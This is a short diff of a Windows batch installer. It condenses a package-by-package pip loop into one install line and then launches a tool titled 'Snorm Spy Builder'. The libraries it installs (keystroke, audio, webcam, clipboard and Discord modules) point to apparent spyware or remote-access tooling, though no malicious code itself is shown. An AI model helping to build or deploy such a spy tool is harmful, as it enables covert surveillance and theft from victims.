@@ -11,35 +11,13 @@ if %errorlevel% neq 0 (
     exit
 )
 
-title Updating Pip...
+title Installing required libraries...
+
 python -m pip install --upgrade pip --quiet
-
-title Downloading libraries...
-
-for %%A in (
-    "requests"
-    "pycryptodome"
-    "discord.py"
-    "opencv-python"
-    "pyperclip"
-    "pillow"
-    "uuid"
-    "imageio"
-    "pywin32"
-    "pynput"
-    "pyaudio"
-    "wave"
-) do (
-    echo Checking %%~A...
-    python -c "import %%~A" >nul 2>&1
-    if %errorlevel% neq 0 (
-        echo Installing %%~A...
-        python -m pip install %%~A --quiet
-    )
-)
+python -m pip install requests pycryptodome discord.py opencv-python pyperclip pillow uuid imageio pywin32 pynput pyaudio wave --quiet
 
 cls
-title Snormy Spy Builder
+title Snorm Spy Builder
 python setup.py
 if %errorlevel% neq 0 goto ERROR
 exit
